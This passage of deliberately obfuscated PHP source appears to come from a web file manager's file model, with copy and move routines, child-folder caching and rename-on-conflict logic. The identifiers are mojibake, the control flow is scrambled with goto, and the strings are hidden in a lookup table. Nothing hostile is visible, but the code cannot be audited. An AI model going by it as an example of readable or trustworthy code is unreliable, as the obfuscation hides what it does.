BğÁ˜´ÁÙÒ; BğÁ˜´ÁÙÒ: return $D¨É¨ÉË¡; goto BªÈ¨Ü¨·; d‘‡¼ƒ‰„Ş: $bŒø“È‚¹ã =& $_SERVER[…ë˜õ]; $A¢Ô ¡†ÚÒ = $this->sourceInfo($AÛ‰ƒ¯³¶); $FŞ˜Ç¨ÚÇæ = $this->sourceInfo($Aõİ–»Ö¶); goto B¬…Óöå³Í; BªÈ¨Ü¨·: } private $targetIsDelete = 0; public function copy($F¥Ò¥–¢¹, $a™ò¶ßŸ“, $d§–ŠÊ¶ÒÉ = REPEAT_REPLACE, $F„İ®Ã¯èí = '') { goto EùĞ¥Çìæ·; cñ”õïİÕ: $this->lockCopyStart($F¥Ò¥–¢¹); $this->lockWriteStart($a™ò¶ßŸ“, $Fë ÅÔ“º³); $AîğŒíñ° = array($C•–ŞÍ§·ô[524] => array(), $C•–ŞÍ§·ô[525] => array(), $C•–ŞÍ§·ô[526] => array()); goto c™ßÍšµ„Â; c™ßÍšµ„Â: $this->targetIsDelete = intval($CÊóªœ³ƒ¾[$C•–ŞÍ§·ô[417]]); $bÒ·˜›ŸÑ© = $this->fileNameExistCache($a™ò¶ßŸ“, $CÊóªœ³ƒ¾[$C•–ŞÍ§·ô[28]]); $bë³¦·œİä = $this->_copy($F¥Ò¥–¢¹, $a™ò¶ßŸ“, $d§–ŠÊ¶ÒÉ, $AîğŒíñ°, !0, $F„İ®Ã¯èí); goto E¼Ìäªàã; C¾ïÏÊ©Ù: $this->updateModifyTime($a™ò¶ßŸ“); return $bë³¦·œİä; goto B•îôÖóÖ; BÔ¿ÁöÀĞ: $this->saveAll($AîğŒíñ°[$C•–ŞÍ§·ô[526]]); Model($C•–ŞÍ§·ô[191])->linkAdd($AîğŒíñ°[$C•–ŞÍ§·ô[524]]); $this->folderSizeReset($a™ò¶ßŸ“); goto C¾ïÏÊ©Ù; féŞæ¡ò½ò: if ($CÊóªœ³ƒ¾[$C•–ŞÍ§·ô[397]] == $C•–ŞÍ§·ô[86] && $bÒ·˜›ŸÑ© == $bë³¦·œİä) { $this->folderSizeResetChildren($bÒ·˜›ŸÑ©); } Model($C•–ŞÍ§·ô[527])->addAll($AîğŒíñ°[$C•–ŞÍ§·ô[525]], array(), !0); if ($bÒ·˜›ŸÑ© != $bë³¦·œİä || $CÊóªœ³ƒ¾[$C•–ŞÍ§·ô[397]] == $C•–ŞÍ§·ô[86]) { Model($C•–ŞÍ§·ô[528])->eventCopy($bë³¦·œİä); } goto BÔ¿ÁöÀĞ; b™Åšİ…¢Ä: if (!$CÊóªœ³ƒ¾ || !$fîÎ²è³‡‡ || $fîÎ²è³‡‡[$C•–ŞÍ§·ô[397]] != $C•–ŞÍ§·ô[86]) { return !1; } if ($this->isParentOf($F¥Ò¥–¢¹, $a™ò¶ßŸ“)) { return !1; } $Fë ÅÔ“º³ = $F„İ®Ã¯èí ? $F„İ®Ã¯èí : $CÊóªœ³ƒ¾[$C•–ŞÍ§·ô[28]]; goto cñ”õïİÕ; EùĞ¥Çìæ·: $C•–ŞÍ§·ô =& $_SERVER[…ë˜õ]; $CÊóªœ³ƒ¾ = $this->sourceInfo($F¥Ò¥–¢¹); $fîÎ²è³‡‡ = $this->sourceInfo($a™ò¶ßŸ“); goto b™Åšİ…¢Ä; E¼Ìäªàã: $this->_childrenListClear(); $this->lockCopyEnd($F¥Ò¥–¢¹); $this->lockWriteEnd($a™ò¶ßŸ“, $Fë ÅÔ“º³); goto féŞæ¡ò½ò; B•îôÖóÖ: } private function _copy($Bâ¿øÕ°Ó, $dÉÒÏš©Šº, $e˜ƒÄˆ‰Æ, &$e©Ü»Ñµë›, $FÆ˜à´˜¼¬, $eÍ©Ç•ìšœ = '') { goto fí¨óË´Â½; fí¨óË´Â½: $D„‹Ñ¸Ğ«Î =& $_SERVER[…ë˜õ]; $fˆ„ï‚Àï = $this->sourceInfoCache($Bâ¿øÕ°Ó); $BİÍ²İÃ¥Š = $fˆ„ï‚Àï[$D„‹Ñ¸Ğ«Î[397]] == $D„‹Ñ¸Ğ«Î[86]; goto Aõİ¦¿­ÙÁ; Aõİ¦¿­ÙÁ: $aéÇ…Ñ¶±œ = $eÍ©Ç•ìšœ ? $eÍ©Ç•ìšœ : $fˆ„ï‚Àï[$D„‹Ñ¸Ğ«Î[28]]; $bíóö¼£¦ï = $this->fileNameExistCache($dÉÒÏš©Šº, $aéÇ…Ñ¶±œ); if ($FÆ˜à´˜¼¬) { $this->_childrenAllMake($Bâ¿øÕ°Ó); if ($BİÍ²İÃ¥Š && $bíóö¼£¦ï) { $this->_childrenAllMake($bíóö¼£¦ï); } } goto a«‚²¶Â½; A›ÅÊ¦ºË: return $FŠù¸îª¡‹; goto DêñÆÜÓ©¾; a«‚²¶Â½: if (!$bíóö¼£¦ï) { return $this->_copyCreate($Bâ¿øÕ°Ó, $dÉÒÏš©Šº, $aéÇ…Ñ¶±œ, $e©Ü»Ñµë›); } $FŠù¸îª¡‹ = $bíóö¼£¦ï; if ($BİÍ²İÃ¥Š) { if ($e˜ƒÄˆ‰Æ == REPEAT_RENAME_FOLDER) { $aéÇ…Ñ¶±œ = $this->fileNameAutoCache($dÉÒÏš©Šº, $aéÇ…Ñ¶±œ, $e˜ƒÄˆ‰Æ, $BİÍ²İÃ¥Š); $FŠù¸îª¡‹ = $this->_copyCreate($Bâ¿øÕ°Ó, $dÉÒÏš©Šº, $aéÇ…Ñ¶±œ, $e©Ü»Ñµë›); } else { $e„ß¨•¡ = $this->_childrenList($Bâ¿øÕ°Ó); foreach ($e„ß¨•¡ as $fÆä±ì÷ºÎ) { $this->_copy($fÆä±ì÷ºÎ[$D„‹Ñ¸Ğ«Î[390]], $bíóö¼£¦ï, $e˜ƒÄˆ‰Æ, $e©Ü»Ñµë›, !1); } } } else { if ($e˜ƒÄˆ‰Æ == REPEAT_RENAME || $e˜ƒÄˆ‰Æ == REPEAT_RENAME_FOLDER) { $aéÇ…Ñ¶±œ = $this->fileNameAutoCache($dÉÒÏš©Šº, $aéÇ…Ñ¶±œ, $e˜ƒÄˆ‰Æ, $BİÍ²İÃ¥Š); $FŠù¸îª¡‹ = $this->_copyCreate($Bâ¿øÕ°Ó, $dÉÒÏš©Šº, $aéÇ…Ñ¶±œ, $e©Ü»Ñµë›); } else { if ($e˜ƒÄˆ‰Æ == REPEAT_REPLACE) { $D‚”¤•óù« = $this->sourceInfoCache($bíóö¼£¦ï); $eíŠ•Ï¸„ñ = $this->fileHistory($D‚”¤•óù«, $fˆ„ï‚Àï[$D„‹Ñ¸Ğ«Î[441]], $fˆ„ï‚Àï[$D„‹Ñ¸Ğ«Î[77]]); if ($eíŠ•Ï¸„ñ) { $e©Ü»Ñµë›[$D„‹Ñ¸Ğ«Î[524]][] = $fˆ„ï‚Àï[$D„‹Ñ¸Ğ«Î[441]]; } } else { if ($e˜ƒÄˆ‰Æ == REPEAT_SKIP) { } } } Hook::trigger($D„‹Ñ¸Ğ«Î[529], array($D„‹Ñ¸Ğ«Î[530], $fˆ„ï‚Àï, 0)); } goto A›ÅÊ¦ºË; DêñÆÜÓ©¾: } private function _copyCreate($dšëÚœ¡, $dù–š¿¢±, $eòÁƒ†‚®, &$BÄÅªß†÷ª) { goto bîÒ¤Å­È; cøÏ˜´¹’ê: foreach ($D³‘‹Óñ¼ as $Cò•Û¬ÃÌ) { $D‘—¸Îï©æ = $Cò•Û¬ÃÌ[$B’º—›«Õ[390]]; $Fˆ—’¿Œ = $this->_childrenMatch($f¿–šøƒÄ, $Cò•Û¬ÃÌ, $F‰¨”ãæê™); $eà¤Ó˜—Ğ˜[] = array($B’º—›«Õ[390], $D‘—¸Îï©æ, $B’º—›«Õ[472], $Fˆ—’¿Œ[$B’º—›«Õ[472]]); $f“¯šäÓË[] = array($B’º—›«Õ[390], $D‘—¸Îï©æ, $B’º—›«Õ[481], $Fˆ—’¿Œ[$B’º—›«Õ[481]]); $this->_copyApplyMeta($Cò•Û¬ÃÌ, $BÄÅªß†÷ª); if ($Cò•Û¬ÃÌ[$B’º—›«Õ[397]] != $B’º—›«Õ[86]) { $BÄÅªß†÷ª[$B’º—›«Õ[524]][] = $Cò•Û¬ÃÌ[$B’º—›«Õ[441]]; } } $this->chunkEventSet($B’º—›«Õ[536], array($B’º—›«Õ[537], $e•÷’Ó¨ì, $D§åŠ˜•Ô—)); $this->saveAll($eà¤Ó˜—Ğ˜); goto Cã°×ˆó…È; fí‹‰Ê¥•è: if ($B‚èƒ¨ÌÀ–[$B’º—›«Õ[397]] != $B’º—›«Õ[86]) { $BÄÅªß†÷ª[$B’º—›«Õ[524]][] = $B‚èƒ¨ÌÀ–[$B’º—›«Õ[441]]; return $A„š”½; } $CÊ£íº½Õ = array(); $A¯©ŒÜÄ‘ä = array(); goto dÚáŸŒ§…Ü; dÚáŸŒ§…Ü: $this->_childrenListAll($dšëÚœ¡, $CÊ£íº½Õ); $D§åŠ˜•Ô— = count($CÊ£íº½Õ); if ($D§åŠ˜•Ô— == 0) { return $A„š”½; } goto F†ò¨»Ì­±; Cã°×ˆó…È: $this->chunkEventSet($B’º—›«Õ[538], array($B’º—›«Õ[539], $e•÷’Ó¨ì, $D§åŠ˜•Ô—)); $this->saveAll($f“¯šäÓË); return $A„š”½; goto EêÓèëâõ; aÏ»ª…áÈ•: $f¿–šøƒÄ[$dšëÚœ¡] = $A„š”½; $eà¤Ó˜—Ğ˜ = array(); $f“¯šäÓË = array(); goto cøÏ˜´¹’ê; bîÒ¤Å­È: $B’º—›«Õ =& $_SERVER[…ë˜õ]; $B‚èƒ¨ÌÀ– = $this->sourceInfoCache($dšëÚœ¡); $Eä„¡†Ö«­ = $this->sourceInfoCache($dù–š¿¢±); goto f¯÷æ¿ã•ß; AÃ§˜¨ÇÎÓ: $A„š”½ = $this->add($e•÷’Ó¨ì); $eäÕÓ“Æ = array($B’º—›«Õ[390] => $A„š”½, $B’º—›«Õ[28] => $eòÁƒ†‚®); $this->_copyApplyMeta($eäÕÓ“Æ, $BÄÅªß†÷ª); goto fí‹‰Ê¥•è; CÙ¨àß‡: $this->addAll($A¯©ŒÜÄ‘ä, array(), !1); $D³‘‹Óñ¼ = $this->where(array($B’º—›«Õ[472] => $A„š”½))->select(); $f¿–šøƒÄ = $this->_childrenMakeRelation($CÊ£íº½Õ, $D³‘‹Óñ¼); goto aÏ»ª…áÈ•; F†ò¨»Ì­±: $F‰¨”ãæê™ = $this->sourceInfo($A„š”½); foreach ($CÊ£íº½Õ as $Cò•Û¬ÃÌ) { $b½âÀ¨×ë„ = $this->_makeItemData($Cò•Û¬ÃÌ, $F‰¨”ãæê™, $Cò•Û¬ÃÌ[$B’º—›«Õ[28]]); $b½âÀ¨×ë„[$B’º—›«Õ[481]] = $Cò•Û¬ÃÌ[$B’º—›«Õ[481]]; $A¯©ŒÜÄ‘ä[] = $b½âÀ¨×ë„; } $this->chunkEventSet($B’º—›«Õ[534], array($B’º—›«Õ[535], $e•÷’Ó¨ì, $D§åŠ˜•Ô—)); goto CÙ¨àß‡; f¯÷æ¿ã•ß: $e•÷’Ó¨ì = $this->_makeItemData($B‚èƒ¨ÌÀ–, $Eä„¡†Ö«­, $eòÁƒ†‚®); Hook::trigger($B’º—›«Õ[531], $e•÷’Ó¨ì); Hook::trigger($B’º—›«Õ[532], array($B’º—›«Õ[533], $e•÷’Ó¨ì, 0)); goto AÃ§˜¨ÇÎÓ; EêÓèëâõ: } private function _childrenMakeRelation($Fà„”ÊƒÙ´, $bÚÙºñÊç) { $Fğ·ÓêäÂø =& $_SERVER[…ë˜õ]; $a¢­‡Ù•ÑÎ = array(); $Bæ­±Á³ê§ = array(); foreach ($Fà„”ÊƒÙ´ as $DåÍğÈÈäõ) { $d‡Ã¬Êô = $DåÍğÈÈäõ[$Fğ·ÓêäÂø[28]] . $Fğ·ÓêäÂø[8] . $DåÍğÈÈäõ[$Fğ·ÓêäÂø[481]]; $a¢­‡Ù•ÑÎ[$d‡Ã¬Êô] = $DåÍğÈÈäõ[$Fğ·ÓêäÂø[390]]; } foreach ($bÚÙºñÊç as $DåÍğÈÈäõ) { $d‡Ã¬Êô = $DåÍğÈÈäõ[$Fğ·ÓêäÂø[28]] . $Fğ·ÓêäÂø[8] . $DåÍğÈÈäõ[$Fğ·ÓêäÂø[481]]; $BÕ‰‡­½Ÿ = $a¢­‡Ù•ÑÎ[$d‡Ã¬Êô]; $Bæ­±Á³ê§[$BÕ‰‡­½Ÿ] = $DåÍğÈÈäõ[$Fğ·ÓêäÂø[390]]; } return $Bæ­±Á³ê§; } private function _childrenMatch($F¯¹åâŞ’¥, $cŞÅõµÜ§«, $BÊ•™÷ßË) { goto B§¨‚±ÄÁÁ; D·âõ¾½•Ş: foreach ($cƒ‡²Š­¶‹ as $A¶ğ›îÀ„Ù) { if (isset($F¯¹åâŞ’¥[$A¶ğ›îÀ„Ù])) { $fóÁĞºÈ˜Š .= $F¯¹åâŞ’¥[$A¶ğ›îÀ„Ù] . $B¿ÂœœÇ³[540]; } } $fóÁĞºÈ˜Š = rtrim($fóÁĞºÈ˜Š, $B¿ÂœœÇ³[47]) . $B¿ÂœœÇ³[47]; $c¾à˜–Œç = $this->parentLevelArray($fóÁĞºÈ˜Š); goto EÁËõ–İ“; B§¨‚±ÄÁÁ: $B¿ÂœœÇ³ =& $_SERVER[…ë˜õ]; $fóÁĞºÈ˜Š = $BÊ•™÷ßË[$B¿ÂœœÇ³[481]]; $cƒ‡²Š­¶‹ = $this->parentLevelArray($cŞÅõµÜ§«[$B¿ÂœœÇ³[481]]); goto D·âõ¾½•Ş; EÁËõ–İ“: $Eé‡¶‘ÉÉ = $c¾à˜–Œç[count($c¾à˜–Œç) - 1]; return array($B¿ÂœœÇ³[472] => $Eé‡¶‘ÉÉ, $B¿ÂœœÇ³[481] => $fóÁĞºÈ˜Š); goto EÜ·ºÎª; EÜ·ºÎª: } private function _makeItemData($cİ¼ÏÕ¹­µ, $EÖÏ¡ÔÛ•, $Eëğéäãèí) { $cª«³É—§ß =& $_SERVER[…ë˜õ]; $F¯¢ÖÃ¯º = array($cª«³É—§ß[541] => $cİ¼ÏÕ¹­µ[$cª«³É—§ß[397]], $cª«³É—§ß[407] => $Eëğéäãèí, $cª«³É—§ß[542] => $cİ¼ÏÕ¹­µ[$cª«³É—§ß[399]], $cª«³É—§ß[442] => $cİ¼ÏÕ¹­µ[$cª«³É—§ß[441]], $cª«³É—§ß[543] => $cİ¼ÏÕ¹­µ[$cª«³É—§ß[77]], $cª«³É—§ß[544] => $EÖÏ¡ÔÛ•[$cª«³É—§ß[398]], $cª«³É—§ß[545] => $EÖÏ¡ÔÛ•[$cª«³É—§ß[478]], $cª«³É—§ß[546] => USER_ID, $cª«³É—§ß[547] => USER_ID, $cª«³É—§ß[389] => $EÖÏ¡ÔÛ•[$cª«³É—§ß[390]], $cª«³É—§ß[548] => $EÖÏ¡ÔÛ•[$cª«³É—§ß[481]] . $EÖÏ¡ÔÛ•[$cª«³É—§ß[390]] . $cª«³É—§ß[47], $cª«³É—§ß[416] => 0, $cª«³É—§ß[549] => $cª«³É—§ß[33]); return $F¯¢ÖÃ¯º; } private function _copyApplyMeta($b•³åŠ‚, &$dÙ–óÒ¿™Ä) { $b‡ç¼³µ =& $_SERVER[…ë˜õ]; $aôáÒÙøİ = $b•³åŠ‚[$b‡ç¼³µ[390]]; $bÍÓÏ³¢Ç = $b•³åŠ‚[$b‡ç¼³µ[28]]; if (!isset($b•³åŠ‚[$b‡ç¼³µ[550]]) || !$b•³åŠ‚[$b‡ç¼³µ[550]] || $b•³åŠ‚[$b‡ç¼³µ[550]] == $b‡ç¼³µ[491]) { $dÙ–óÒ¿™Ä[$b‡ç¼³µ[526]][] = array($b‡ç¼³µ[390], $aôáÒÙøİ, $b‡ç¼³µ[550], short_id($aôáÒÙøİ)); } if (Input::check($bÍÓÏ³¢Ç, $b‡ç¼³µ[551])) { $dÙ–óÒ¿™Ä[$b‡ç¼³µ[525]][] = array($b‡ç¼³µ[390] => $aôáÒÙøİ, $b‡ç¼³µ[92] => $b‡ç¼³µ[438], $b‡ç¼³µ[370] => str_replace($b‡ç¼³µ[50], $b‡ç¼³µ[33], Pinyin::encode($bÍÓÏ³¢Ç))); $dÙ–óÒ¿™Ä[$b‡ç¼³µ[525]][] = array($b‡ç¼³µ[390] => $aôáÒÙøİ, $b‡ç¼³µ[92] => $b‡ç¼³µ[437], $b‡ç¼³µ[370] => Pinyin::encode($bÍÓÏ³¢Ç, $b‡ç¼³µ[552])); } } private $_childrenListCache = array(); private $_childrenItemCache = array(); private function _childrenAllMake($b‰ßº‘Ç¸•) { goto b±ƒ¬Øİå; Fğ’à¨ğóƒ: $eáŠğ³äŒ¬ = array_to_keyvalue($eáŠğ³äŒ¬, $a„ÏµÕÃÕ×[390]); foreach ($eáŠğ³äŒ¬ as $c÷ã¸¼®œ¾) { $AÒóˆ¼Ùâ– = $c÷ã¸¼®œ¾[$a„ÏµÕÃÕ×[472]]; $b‰ßº‘Ç¸• = $c÷ã¸¼®œ¾[$a„ÏµÕÃÕ×[390]]; if (!isset($this->_childrenListCache[$b‰ßº‘Ç¸•]) && $c÷ã¸¼®œ¾[$a„ÏµÕÃÕ×[397]] == $a„ÏµÕÃÕ×[86]) { $this->_childrenListCache[$b‰ßº‘Ç¸•] = array(); } if (!isset($this->_childrenListCache[$AÒóˆ¼Ùâ–])) { $this->_childrenListCache[$AÒóˆ¼Ùâ–] = array(); } $this->_childrenListCache[$AÒóˆ¼Ùâ–][$b‰ßº‘Ç¸•] = $c÷ã¸¼®œ¾; $this->_childrenItemCache[$b‰ßº‘Ç¸•] = $c÷ã¸¼®œ¾; } goto DºÍ¡çòç; b±ƒ¬Øİå: $a„ÏµÕÃÕ× =& $_SERVER[…ë˜õ]; $d…±´àÜäÖ = $this->sourceInfo($b‰ßº‘Ç¸•); $D±×Õˆ˜½ã = $a„ÏµÕÃÕ×[418]; goto cğèñš“‰»; cğèñš“‰»: $d«Çê‚ï­ƒ = array($a„ÏµÕÃÕ×[481] => array($a„ÏµÕÃÕ×[507], $d…±´àÜäÖ[$a„ÏµÕÃÕ×[481]] . $b‰ßº‘Ç¸• . $a„ÏµÕÃÕ×[508]), $a„ÏµÕÃÕ×[417] => $this->targetIsDelete); $eáŠğ³äŒ¬ = $this->field($D±×Õˆ˜½ã)->where($d«Çê‚ï­ƒ)->select(); if (!$eáŠğ³äŒ¬) { return; } goto Fğ’à¨ğóƒ; DºÍ¡çòç: } private function _childrenListAll($F„ÖÀÃ‚, &$c¶ÜéğÇÈ–) { $Bá‰ŠğÓùŠ =& $_SERVER[…ë˜õ]; if (!isset($this->_childrenListCache[$F„ÖÀÃ‚])) { return; } $F²¥ó»²Îß = $this->_childrenListCache[$F„ÖÀÃ‚]; foreach ($F²¥ó»²Îß as $Dá‚İâ­¹  => $F³§ª›Úòˆ) { $c¶ÜéğÇÈ–[$Dá‚İâ­¹ ] = $F³§ª›Úòˆ; if ($F³§ª›Úòˆ[$Bá‰ŠğÓùŠ[397]] == $Bá‰ŠğÓùŠ[86]) { $this->_childrenListAll($Dá‚İâ­¹ , $c¶ÜéğÇÈ–); } } } private function sourceInfoCache($EÀÃŞØäº) { if (isset($this->_childrenItemCache[$EÀÃŞØäº])) { return $this->_childrenItemCache[$EÀÃŞØäº]; } return $this->sourceInfo($EÀÃŞØäº); } private function _childrenList($BÑÜö´åì¡) { if (isset($this->_childrenListCache[$BÑÜö´åì¡])) { return $this->_childrenListCache[$BÑÜö´åì¡]; } return $this->_childrenListSelect($BÑÜö´åì¡); } private function _childrenListSelect($dŠ¹Ú±º‡Œ) { goto aŒƒ¢®ŒĞ; fŞôŠ‡¦×: $cÀÅ×õºÛ‹ = $cÀÅ×õºÛ‹ ? $cÀÅ×õºÛ‹ : array(); $FÂ¤Û£ç…» = array_to_keyvalue($cÀÅ×õºÛ‹, $B×Ô…‰Ìè[390]); $this->_childrenListCache[$dŠ¹Ú±º‡Œ] = $FÂ¤Û£ç…»; goto BŒ„®İéàë; aŒƒ¢®ŒĞ: $B×Ô…‰Ìè =& $_SERVER[…ë˜õ]; $eô®‘½¢ù = array($B×Ô…‰Ìè[472] => $dŠ¹Ú±º‡Œ, $B×Ô…‰Ìè[417] => $this->targetIsDelete); $cÀÅ×õºÛ‹ = $this->where($eô®‘½¢ù)->select(); goto fŞôŠ‡¦×; BŒ„®İéàë: foreach ($FÂ¤Û£ç…» as $dŠ¹Ú±º‡Œ => $c¼Ÿ¤Ê¯øà) { $this->_childrenItemCache[$dŠ¹Ú±º‡Œ] = $c¼Ÿ¤Ê¯øà; } return $FÂ¤Û£ç…»; goto fŞ¬Ìá­§; fŞ¬Ìá­§: } private function fileNameExistCache($f“Úº„Ïªƒ, $e‘½–š¨Ú·) { $fõŠ¡Øí‡ =& $_SERVER[…ë˜õ]; $e‘½–š¨Ú· = strtolower($e‘½–š¨Ú·); $fçÌî—©›ğ = $this->_childrenList($f“Úº„Ïªƒ); foreach ($fçÌî—©›ğ as $C—ŞÇÖßÁ) { if ($e‘½–š¨Ú· == strtolower($C—ŞÇÖßÁ[$fõŠ¡Øí‡[28]])) { return $C—ŞÇÖßÁ[$fõŠ¡Øí‡[390]]; } } return !1; } private function fileNameAutoCache($d‰ÉÃïó‘·, $aêÈ¹»ˆíÁ, $f´½¬Ç«Ä´, $D†çÈ„ô½†) { $a¸ÖÙ®Š„Ô =& $_SERVER[…ë˜õ]; $aİ‰ÅÍîå = $this->_childrenList($d‰ÉÃïó‘·); $cŠğ‡‰ë»Ú = array_to_keyvalue($aİ‰ÅÍîå, $a¸ÖÙ®Š„Ô[33], $a¸ÖÙ®Š„Ô[28]); return $this->fileNameAutoGet($cŠğ‡‰ë»Ú, $aêÈ¹»ˆíÁ, $f´½¬Ç«Ä´, $D†çÈ„ô½†); } private function _childrenListClear() { $this->_childrenListCache = null; $this->_childrenItemCache = null; $this->_childrenListCache = array(); $this->_childrenItemCache = array(); } public function move($CæëŸ’¤¿, $f…ÌÑÑçÇ­, $b‰¶ÉÍÏÉ’ = REPEAT_REPLACE, $bî·›¶­¸å = '') { goto f×ŒÏš²¾Ÿ; BŒÖ§¥È‚: $this->lockMoveEnd($CæëŸ’¤¿); $this->lockWriteEnd($f…ÌÑÑçÇ­, $a¿†£µ¡¹); $this->folderSizeReset($f‡‡Ÿ’áß¼[$DôÈ—Šæ¹[472]]); goto EŞ²µñµ†ù; A‰…¹ë³«·: $this->lockWriteStart($f…ÌÑÑçÇ­, $a¿†£µ¡¹); $A«İîñŸ“¦ = array($DôÈ—Šæ¹[524] => array(), $DôÈ—Šæ¹[555] => !1); $this->clearShare($CæëŸ’¤¿, $f…ÌÑÑçÇ­); goto Dó½ŠËàùƒ; DùÖ„Äß…: if ($f‡‡Ÿ’áß¼[$DôÈ—Šæ¹[397]] == $DôÈ—Šæ¹[86] && $AâÒï¸šì±) { $this->folderSizeResetChildren($B¥‚ĞĞêƒ¸); } Model($DôÈ—Šæ¹[191])->linkAdd($A«İîñŸ“¦[$DôÈ—Šæ¹[524]]); if ($AâÒï¸šì± && $A«İîñŸ“¦[$DôÈ—Šæ¹[555]]) { $this->removeNow($CæëŸ’¤¿, !1); } goto BŒÖ§¥È‚; dÒ÷––ÜÄ: if ($f‡‡Ÿ’áß¼[$DôÈ—Šæ¹[472]] == $DËÕâ›¾í‡[$DôÈ—Šæ¹[390]]) { if ($f‡‡Ÿ’áß¼[$DôÈ—Šæ¹[417]] == $DôÈ—Šæ¹[86]) { Model($DôÈ—Šæ¹[415])->restore(array($CæëŸ’¤¿)); } if (!$bî·›¶­¸å || $bî·›¶­¸å == $f‡‡Ÿ’áß¼[$DôÈ—Šæ¹[28]]) { return $CæëŸ’¤¿; } } $EèÅô†ŒËğ = $this->pathInfoMore($CæëŸ’¤¿); if ($this->isParentOf($CæëŸ’¤¿, $f…ÌÑÑçÇ­)) { return !1; } goto CÁ”ò¢ ¤¯; e®·£‚­è: $this->updateModifyTime($BÆæ“ÊãÚ); Model($DôÈ—Šæ¹[528])->eventMove($CæëŸ’¤¿, $f‡‡Ÿ’áß¼[$DôÈ—Šæ¹[472]], $f…ÌÑÑçÇ­); Hook::trigger($DôÈ—Šæ¹[554], $EèÅô†ŒËğ); goto A¯ÙíŞÈ´; f×ŒÏš²¾Ÿ: $DôÈ—Šæ¹ =& $_SERVER[…ë˜õ]; $f‡‡Ÿ’áß¼ = $this->sourceInfo($CæëŸ’¤¿); $DËÕâ›¾í‡ = $this->sourceInfo($f…ÌÑÑçÇ­); goto dÒ÷––ÜÄ; CÁ”ò¢ ¤¯: if (!$f‡‡Ÿ’áß¼ || !$DËÕâ›¾í‡ || $DËÕâ›¾í‡[$DôÈ—Šæ¹[397]] != $DôÈ—Šæ¹[86]) { return !1; } Hook::trigger($DôÈ—Šæ¹[553], $EèÅô†ŒËğ); $this->targetIsDelete = intval($f‡‡Ÿ’áß¼[$DôÈ—Šæ¹[417]]); goto DğÇù½…; EŞ²µñµ†ù: $this->folderSizeReset($f…ÌÑÑçÇ­); $BÆæ“ÊãÚ = array($f‡‡Ÿ’áß¼[$DôÈ—Šæ¹[472]], $f…ÌÑÑçÇ­); if ($f‡‡Ÿ’áß¼[$DôÈ—Šæ¹[397]] == $DôÈ—Šæ¹[86]) { $BÆæ“ÊãÚ[] = $CæëŸ’¤¿; } goto e®·£‚­è; A¯ÙíŞÈ´: return $B¥‚ĞĞêƒ¸; goto e˜á¬´Õ»; DğÇù½…: if ($f‡‡Ÿ’áß¼[$DôÈ—Šæ¹[472]] == $f…ÌÑÑçÇ­ && $bî·›¶­¸å != $f‡‡Ÿ’áß¼[$DôÈ—Šæ¹[28]]) { $e£Ç•ñÄ‰Ş = $this->fileNameExist($f…ÌÑÑçÇ­, $bî·›¶­¸å); if ($e£Ç•ñÄ‰Ş && $f‡‡Ÿ’áß¼[$DôÈ—Šæ¹[397]] == $DôÈ—Šæ¹[491]) { goto d‡µ©Â¯‘¾; d‡µ©Â¯‘¾: $CÔØÃâë°¸ = $this->sourceInfo($e£Ç•ñÄ‰Ş); $dõ”˜‰Î¨ = $this->fileHistory($CÔØÃâë°¸, $f‡‡Ÿ’áß¼[$DôÈ—Šæ¹[441]], $f‡‡Ÿ’áß¼[$DôÈ—Šæ¹[77]]); if (!$dõ”˜‰Î¨) { Model($DôÈ—Šæ¹[444])->remove($f‡‡Ÿ’áß¼[$DôÈ—Šæ¹[441]]); } goto EÍõ®…¦; EÍõ®…¦: $this->removeNow($CæëŸ’¤¿, !1); $this->folderSizeReset($f…ÌÑÑçÇ­); Hook::trigger($DôÈ—Šæ¹[554], $EèÅô†ŒËğ); goto ešßÈ‘¡Ò¼; ešßÈ‘¡Ò¼: return $e£Ç•ñÄ‰Ş; goto dˆ•§½ š; dˆ•§½ š: } } $a¿†£µ¡¹ = $bî·›¶­¸å ? $bî·›¶­¸å : $f‡‡Ÿ’áß¼[$DôÈ—Šæ¹[28]]; $this->lockMoveStart($CæëŸ’¤¿); goto A‰…¹ë³«·; Dó½ŠËàùƒ: $AâÒï¸šì± = $this->fileNameExistCache($f…ÌÑÑçÇ­, $f‡‡Ÿ’áß¼[$DôÈ—Šæ¹[28]]); $B¥‚ĞĞêƒ¸ = $this->_move($CæëŸ’¤¿, $f…ÌÑÑçÇ­, $b‰¶ÉÍÏÉ’, $A«İîñŸ“¦, $bî·›¶­¸å); $this->sourceCacheClear(); goto DùÖ„Äß…; e˜á¬´Õ»: } private function _move($fªƒ÷é ›ƒ, $AÁ¤õ¦‰ó©, $e•¯çà×ÛÂ, &$A­õëÚ‘Ëì, $CñÆ¯¨çì„ = '') { goto a­¾È„ˆß©; A‹ĞŠÔ»: $this->lockWriteStart($AÁ¤õ¦‰ó©, $DÒ†¼É÷Ú); if (!$d²çë‹Ï‡) { return $this->_moveForce($fªƒ÷é ›ƒ, $AÁ¤õ¦‰ó©, $DÒ†¼É÷Ú); } $d„Ì®ÇÊ‹˜ = $d²çë‹Ï‡; goto EªÛÏ¨ƒæ²; a¢¦öã’×: $DÒ†¼É÷Ú = $CñÆ¯¨çì„ ? $CñÆ¯¨çì„ : $fÕÛµÀøö†[$FÔÅçØá‚â[28]]; $d²çë‹Ï‡ = $this->fileNameExistCache($AÁ¤õ¦‰ó©, $DÒ†¼É÷Ú); $this->lockMoveStart($fªƒ÷é ›ƒ); goto A‹ĞŠÔ»; bÎŠ«¹ËÂ: return $d„Ì®ÇÊ‹˜; goto eá–á¸Í†›; EªÛÏ¨ƒæ²: $F†·ç·ÚÃ = !1; if ($døï¿‰Ü‚¹) { if ($e•¯çà×ÛÂ == REPEAT_RENAME_FOLDER) { $DÒ†¼É÷Ú = $this->fileNameAuto($AÁ¤õ¦‰ó©, $DÒ†¼É÷Ú, $e•¯çà×ÛÂ, $døï¿‰Ü‚¹); $d„Ì®ÇÊ‹˜ = $this->_moveForce($fªƒ÷é ›ƒ, $AÁ¤õ¦‰ó©, $DÒ†¼É÷Ú); } else { if ($e•¯çà×ÛÂ == REPEAT_RENAME_FOLDER) { $e•¯çà×ÛÂ = REPEAT_RENAME; } $BÒïÈÚÛã¹ = $this->_childrenListSelect($fªƒ÷é ›ƒ); foreach ($BÒïÈÚÛã¹ as $A³ŒùêÈ§ï) { $this->_move($A³ŒùêÈ§ï[$FÔÅçØá‚â[390]], $d²çë‹Ï‡, $e•¯çà×ÛÂ, $A­õëÚ‘Ëì); } $F†·ç·ÚÃ = !0; } } else { if ($e•¯çà×ÛÂ == REPEAT_SKIP) { $F†·ç·ÚÃ = !0; } else { if ($e•¯çà×ÛÂ == REPEAT_RENAME || $e•¯çà×ÛÂ == 